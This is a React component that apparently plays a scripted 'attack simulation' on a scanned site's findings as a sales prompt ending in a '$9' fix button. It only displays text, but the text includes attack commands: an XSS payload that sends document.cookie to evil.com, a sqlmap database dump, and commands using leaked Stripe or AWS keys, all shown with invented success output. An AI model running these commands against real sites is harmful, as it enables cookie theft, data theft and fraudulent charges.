"use client";

import { useEffect, useState, useRef, useCallback } from "react";
import { motion, AnimatePresence } from "framer-motion";

interface Vulnerability {
  severity: string;
  type: string;
  file: string;
  description: string;
  line?: number;
}

interface Secret {
  type: string;
  file: string;
  snippet: string;
  severity: string;
}

interface AttackSimulationProps {
  url: string;
  vulnerabilities?: Vulnerability[];
  secrets?: Secret[];
  onClose: () => void;
  onUnlock: () => void;
}

interface TerminalLine {
  text: string;
  color: "green" | "amber" | "red" | "white" | "cyan" | "dim";
  delay?: number;
}

function redactSecret(snippet: string): string {
  return snippet.replace(
    /(['"]?)([a-zA-Z0-9_-]{8,})(['"]?)/g,
    (match, q1, key, q2) => {
      if (key.length < 8) return match;
      const first4 = key.slice(0, 4);
      const last4 = key.slice(-4);
      return `${q1}${first4}${"*".repeat(Math.min(key.length - 8, 16))}${last4}${q2}`;
    }
  );
}

function extractDomain(url: string): string {
  try {
    return new URL(url).hostname;
  } catch {
    return url.replace(/https?:\/\//, "").split("/")[0];
  }
}

function generateFallbackScript(
  url: string,
  vulnerabilities: Vulnerability[],
  secrets: Secret[]
): TerminalLine[] {
  const domain = extractDomain(url);
  const lines: TerminalLine[] = [];

  lines.push({ text: "", color: "dim" });
  lines.push({ text: "[ PHASE 1: RECONNAISSANCE ]", color: "cyan", delay: 500 });
  lines.push({ text: "", color: "dim" });
  lines.push({ text: `$ curl -sI ${url}`, color: "green" });
  lines.push({ text: `  HTTP/2 200`, color: "white" });
  lines.push({ text: `  server: next`, color: "white" });
  lines.push({ text: "", color: "dim" });
  lines.push({ text: `$ curl -s ${url} | grep -oE 'src="[^"]*\\.js"' | head -5`, color: "green" });
  lines.push({ text: `  src="/_next/static/chunks/main-a7b2c3d.js"`, color: "white" });
  lines.push({ text: `  src="/_next/static/chunks/app/page-f8e9d1c.js"`, color: "white" });
  lines.push({ text: "", color: "dim" });
  lines.push({ text: `$ nmap -sV --top-ports 20 ${domain}`, color: "green" });
  lines.push({ text: `  80/tcp  open  http`, color: "white" });
  lines.push({ text: `  443/tcp open  https`, color: "white" });
  lines.push({ text: "", color: "dim" });
  lines.push({ text: `> Target: ${domain} | Framework: Next.js`, color: "amber" });

  lines.push({ text: "", color: "dim" });
  lines.push({ text: "[ PHASE 2: DISCOVERY ]", color: "cyan", delay: 500 });
  lines.push({ text: "", color: "dim" });

  if (secrets.length > 0) {
    const secret = secrets[0];
    const redacted = redactSecret(secret.snippet);
    lines.push({ text: `$ curl -s ${url}/_next/static/chunks/app/page-*.js | grep -iE "key|secret|token|api"`, color: "green" });
    lines.push({ text: "", color: "dim" });
    lines.push({ text: `  [!] LEAKED in ${secret.file}:`, color: "red" });
    lines.push({ text: `      ${redacted}`, color: "amber" });
    lines.push({ text: "", color: "dim" });
    lines.push({ text: `> Type: ${secret.type} | Severity: ${secret.severity.toUpperCase()}`, color: "amber" });
    lines.push({ text: `> Exposure: PUBLIC — visible to anyone`, color: "red" });
  } else if (vulnerabilities.length > 0) {
    const vuln = vulnerabilities[0];
    lines.push({ text: `$ nuclei -u ${url} -t cves/ -t vulnerabilities/`, color: "green" });
    lines.push({ text: "", color: "dim" });
    lines.push({ text: `  [!] ${vuln.type} detected`, color: "red" });
    lines.push({ text: `  File: ${vuln.file}${vuln.line ? `:${vuln.line}` : ""}`, color: "amber" });
    lines.push({ text: `  ${vuln.description}`, color: "white" });
  }

  lines.push({ text: "", color: "dim" });
  lines.push({ text: "[ PHASE 3: EXPLOITATION ]", color: "cyan", delay: 500 });
  lines.push({ text: "", color: "dim" });

  if (secrets.length > 0) {
    const keyType = secrets[0].type.toLowerCase();
    if (keyType.includes("stripe")) {
      lines.push({ text: `$ curl https://api.stripe.com/v1/charges -u "${redactSecret(secrets[0].snippet)}:"`, color: "green" });
      lines.push({ text: `  {"id":"ch_3Mq...","status":"succeeded","amount":50000}`, color: "red" });
      lines.push({ text: `> Payment API compromised — attacker can make charges`, color: "red" });
    } else if (keyType.includes("aws")) {
      lines.push({ text: `$ aws s3 ls --profile stolen`, color: "green" });
      lines.push({ text: `  2024-01-15 prod-backups`, color: "red" });
      lines.push({ text: `  2024-03-01 database-exports`, color: "red" });
      lines.push({ text: `> Full AWS access — S3 buckets exposed`, color: "red" });
    } else {
      lines.push({ text: `$ python3 exploit.py --key "${redactSecret(secrets[0].snippet)}" --target ${domain}`, color: "green" });
      lines.push({ text: `  [+] Authentication successful`, color: "red" });
      lines.push({ text: `  [+] Enumerating resources...`, color: "red" });
      lines.push({ text: `> API access achieved with stolen ${secrets[0].type}`, color: "red" });
    }
  } else if (vulnerabilities.length > 0) {
    const vuln = vulnerabilities[0];
    const vType = vuln.type.toLowerCase();
    if (vType.includes("xss")) {
      lines.push({ text: `$ curl "${url}/${vuln.file}?q=<script>fetch('https://evil.com/'+document.cookie)</script>"`, color: "green" });
      lines.push({ text: `  [+] XSS payload reflected — cookie theft possible`, color: "red" });
    } else if (vType.includes("sql")) {
      lines.push({ text: `$ sqlmap -u "${url}/${vuln.file}" --dbs --batch`, color: "green" });
      lines.push({ text: `  [+] database: production_db`, color: "red" });
      lines.push({ text: `  [+] tables: users, payments, sessions`, color: "red" });
    } else {
      lines.push({ text: `$ python3 exploit.py --vuln "${vuln.type}" --target ${url}`, color: "green" });
      lines.push({ text: `  [+] Vulnerability exploited successfully`, color: "red" });
    }
  }

  lines.push({ text: "", color: "dim" });
  lines.push({ text: "[ PHASE 4: IMPACT ASSESSMENT ]", color: "cyan", delay: 500 });
  lines.push({ text: "", color: "dim" });
  lines.push({ text: `> ─────────────────────────────────`, color: "dim" });

  if (secrets.length > 0 || vulnerabilities.some(v => ["critical", "high"].includes(v.severity))) {
    if (secrets.length > 0) {
      lines.push({ text: `> [x] API keys stolen — services compromised`, color: "red" });
      lines.push({ text: `> [x] Financial data accessible`, color: "red" });
    }
    const crits = vulnerabilities.filter(v => v.severity === "critical").length;
    if (crits > 0) lines.push({ text: `> [x] ${crits} critical vuln(s) — full system compromise`, color: "red" });
    lines.push({ text: `> ─────────────────────────────────`, color: "dim" });
    lines.push({ text: `> Time to exploit: < 5 minutes`, color: "red" });
    lines.push({ text: `> Skill required: Low (automated tools)`, color: "red" });
    lines.push({ text: `> Detection chance: Near zero`, color: "red" });
    lines.push({ text: "", color: "dim" });
    lines.push({ text: `> Anyone can view-source and do this.`, color: "red" });
  } else {
    lines.push({ text: `> ${vulnerabilities.length} issue(s) found`, color: "amber" });
    lines.push({ text: `> Exploitation: Medium difficulty`, color: "amber" });
    lines.push({ text: `> Recommended: Fix before disclosure`, color: "amber" });
  }

  lines.push({ text: "", color: "dim" });
  lines.push({ text: "─── SIMULATION COMPLETE ───", color: "cyan", delay: 400 });

  return lines;
}

export default function AttackSimulation({
  url,
  vulnerabilities = [],
  secrets = [],
  onClose,
  onUnlock,
}: AttackSimulationProps) {
  const [displayedLines, setDisplayedLines] = useState<{ text: string; color: string }[]>([]);
  const [currentLineIndex, setCurrentLineIndex] = useState(0);
  const [currentCharIndex, setCurrentCharIndex] = useState(0);
  const [isComplete, setIsComplete] = useState(false);
  const [isPaused, setIsPaused] = useState(false);
  const [isLoading, setIsLoading] = useState(true);
  const terminalRef = useRef<HTMLDivElement>(null);
  const animationRef = useRef<ReturnType<typeof setTimeout> | null>(null);
  const scriptRef = useRef<TerminalLine[]>([]);

  // Fetch AI-generated script
  useEffect(() => {
    let cancelled = false;

    async function fetchScript() {
      try {
        const res = await fetch("/api/simulate", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ url, vulnerabilities, secrets }),
        });

        if (!res.ok) throw new Error("API error");

        const data = await res.json();
        if (!cancelled && data.lines && Array.isArray(data.lines) && data.lines.length > 5) {
          scriptRef.current = data.lines;
        } else {
          throw new Error("Invalid response");
        }
      } catch {
        // Fallback to local generation
        if (!cancelled) {
          scriptRef.current = generateFallbackScript(url, vulnerabilities, secrets);
        }
      } finally {
        if (!cancelled) {
          setIsLoading(false);
        }
      }
    }

    fetchScript();
    return () => { cancelled = true; };
  }, [url, vulnerabilities, secrets]);

  // ESC key handler
  useEffect(() => {
    const handleKeyDown = (e: KeyboardEvent) => {
      if (e.key === "Escape") handleClose();
    };
    window.addEventListener("keydown", handleKeyDown);
    return () => window.removeEventListener("keydown", handleKeyDown);
  // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  // Typewriter animation
  const tick = useCallback(() => {
    if (isPaused || isLoading) return;

    const script = scriptRef.current;
    if (currentLineIndex >= script.length) {
      setIsComplete(true);
      return;
    }

    const currentLine = script[currentLineIndex];

    if (currentCharIndex === 0 && currentLine.delay) {
      animationRef.current = setTimeout(() => {
        setDisplayedLines((prev) => [...prev, { text: "", color: currentLine.color }]);
        setCurrentCharIndex(1);
      }, currentLine.delay);
      return;
    }

    if (currentLine.text === "" || currentCharIndex >= currentLine.text.length) {
      setDisplayedLines((prev) => {
        const updated = [...prev];
        if (updated.length === 0 || currentCharIndex === 0) {
          updated.push({ text: currentLine.text, color: currentLine.color });
        } else {
          updated[updated.length - 1] = { text: currentLine.text, color: currentLine.color };
        }
        return updated;
      });
      setCurrentLineIndex((prev) => prev + 1);
      setCurrentCharIndex(0);
      if (terminalRef.current) {
        terminalRef.current.scrollTop = terminalRef.current.scrollHeight;
      }
      return;
    }

    const partialText = currentLine.text.slice(0, currentCharIndex + 1);
    setDisplayedLines((prev) => {
      const updated = [...prev];
      if (currentCharIndex === 1 && currentLine.delay) {
        updated[updated.length - 1] = { text: partialText, color: currentLine.color };
      } else if (currentCharIndex === 0) {
        updated.push({ text: partialText, color: currentLine.color });
      } else {
        updated[updated.length - 1] = { text: partialText, color: currentLine.color };
      }
      return updated;
    });
    setCurrentCharIndex((prev) => prev + 1);

    if (terminalRef.current) {
      terminalRef.current.scrollTop = terminalRef.current.scrollHeight;
    }
  }, [currentLineIndex, currentCharIndex, isPaused, isLoading]);

  useEffect(() => {
    if (isPaused || isComplete || isLoading) return;

    const script = scriptRef.current;
    if (script.length === 0) return;

    const currentLine = script[currentLineIndex];
    if (!currentLine) {
      setIsComplete(true);
      return;
    }

    let speed = 25;
    if (currentLine.color === "green") speed = 30;
    if (currentLine.color === "white" || currentLine.color === "dim") speed = 12;
    if (currentLine.text === "") speed = 80;

    animationRef.current = setTimeout(tick, speed);

    return () => {
      if (animationRef.current) clearTimeout(animationRef.current);
    };
  }, [tick, isPaused, isComplete, isLoading, currentLineIndex]);

  const handleClose = () => {
    setIsPaused(true);
    if (animationRef.current) clearTimeout(animationRef.current);
    onClose();
  };

  const colorClasses: Record<string, string> = {
    green: "text-green-400",
    amber: "text-amber-400",
    red: "text-red-400",
    white: "text-gray-200",
    cyan: "text-cyan-400",
    dim: "text-gray-600",
  };

  return (
    <AnimatePresence>
      <motion.div
        initial={{ opacity: 0 }}
        animate={{ opacity: 1 }}
        exit={{ opacity: 0 }}
        className="fixed inset-0 z-[100] flex items-center justify-center"
      >
        {/* Backdrop */}
        <div className="absolute inset-0 bg-black/90 backdrop-blur-sm" onClick={handleClose} />

        {/* Terminal Window */}
        <motion.div
          initial={{ scale: 0.9, opacity: 0, y: 20 }}
          animate={{ scale: 1, opacity: 1, y: 0 }}
          exit={{ scale: 0.9, opacity: 0, y: 20 }}
          transition={{ type: "spring", damping: 25, stiffness: 300 }}
          className="relative w-[95vw] max-w-4xl h-[85vh] max-h-[700px] flex flex-col rounded-xl overflow-hidden shadow-2xl shadow-black/50 border border-white/10"
        >
          {/* CRT Scanline overlay */}
          <div
            className="pointer-events-none absolute inset-0 z-30"
            style={{
              background: "repeating-linear-gradient(0deg, rgba(0,0,0,0.03) 0px, rgba(0,0,0,0.03) 1px, transparent 1px, transparent 2px)",
            }}
          />

          {/* Subtle flicker */}
          <div className="pointer-events-none absolute inset-0 z-30 animate-pulse opacity-[0.015]" style={{ background: "rgba(255,255,255,1)" }} />

          {/* Title Bar */}
          <div className="flex items-center justify-between px-4 py-3 bg-[#1a1a2e] border-b border-white/5 shrink-0">
            <div className="flex items-center gap-2">
              <button onClick={handleClose} className="w-3 h-3 rounded-full bg-red-500 hover:bg-red-400 transition-colors" aria-label="Close" />
              <div className="w-3 h-3 rounded-full bg-yellow-500 opacity-50" />
              <div className="w-3 h-3 rounded-full bg-green-500 opacity-50" />
              <span className="ml-3 text-xs text-gray-500 font-mono">
                attack-sim — {extractDomain(url)}
              </span>
            </div>
            <div className="flex items-center gap-2">
              <span className="relative flex h-2 w-2">
                <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-red-500 opacity-75" />
                <span className="relative inline-flex rounded-full h-2 w-2 bg-red-500" />
              </span>
              <span className="text-[10px] font-bold tracking-widest text-red-400 uppercase">
                Live Simulation
              </span>
            </div>
          </div>

          {/* Terminal Body */}
          <div
            ref={terminalRef}
            className="flex-1 overflow-y-auto p-5 bg-[#0a0a0f] font-mono text-sm leading-relaxed scroll-smooth"
            style={{ textShadow: "0 0 8px rgba(0, 255, 100, 0.08)" }}
          >
            {/* Header */}
            <div className="mb-4 text-gray-600 text-xs">
              <p>OverMCP Attack Simulator v3.0 (AI-powered)</p>
              <p>Target: {url}</p>
              <p>Date: {new Date().toISOString().split("T")[0]}</p>
              <p className="text-red-500/60 mt-1">*** EDUCATIONAL SIMULATION — NO REAL ATTACK IS PERFORMED ***</p>
            </div>

            {/* Loading state */}
            {isLoading && (
              <div className="flex items-center gap-3 text-green-400/70">
                <div className="w-4 h-4 rounded-full border-2 border-green-400/30 border-t-green-400 animate-spin" />
                <span>Generating personalized attack scenario...</span>
              </div>
            )}

            {/* Animated lines */}
            {displayedLines.map((line, i) => (
              <div
                key={i}
                className={`${colorClasses[line.color] || "text-gray-200"} whitespace-pre-wrap break-all min-h-[1.4em]`}
              >
                {line.text}
              </div>
            ))}

            {/* Blinking cursor */}
            {!isComplete && !isLoading && (
              <span className="inline-block w-2 h-4 bg-green-400 animate-pulse ml-0.5 align-middle" />
            )}

            {/* Completion CTA */}
            {isComplete && (
              <motion.div
                initial={{ opacity: 0, y: 10 }}
                animate={{ opacity: 1, y: 0 }}
                transition={{ delay: 0.5 }}
                className="mt-8 pt-6 border-t border-white/10"
              >
                <div className="text-center">
                  <p className="text-red-400 font-bold text-lg mb-2">
                    This is what an attacker sees.
                  </p>
                  <p className="text-gray-400 text-sm mb-6 max-w-md mx-auto">
                    Your vulnerabilities are public. Fix them before someone exploits them for real.
                  </p>
                  <button
                    onClick={onUnlock}
                    className="px-8 py-4 rounded-xl font-bold text-white bg-gradient-to-r from-red-500 to-orange-500 hover:from-red-400 hover:to-orange-400 shadow-lg shadow-red-500/25 transition-all active:scale-[0.98] text-base"
                  >
                    Fix this now — $9
                  </button>
                  <p className="text-gray-600 text-xs mt-3">
                    Full report with fixes for every vulnerability
                  </p>
                </div>
              </motion.div>
            )}
          </div>

          {/* Bottom bar */}
          <div className="flex items-center justify-between px-4 py-2 bg-[#1a1a2e] border-t border-white/5 shrink-0">
            <span className="text-[10px] text-gray-600 font-mono">
              {isLoading
                ? "GENERATING..."
                : isComplete
                ? "SIMULATION COMPLETE"
                : `Phase ${Math.min(4, Math.floor(currentLineIndex / Math.max(1, scriptRef.current.length / 4)) + 1)} of 4`}
            </span>
            <button
              onClick={handleClose}
              className="text-xs text-gray-500 hover:text-white px-3 py-1 rounded-md hover:bg-white/5 transition-colors"
            >
              Close [ESC]
            </button>
          </div>
        </motion.div>
      </motion.div>
    </AnimatePresence>
  );
}
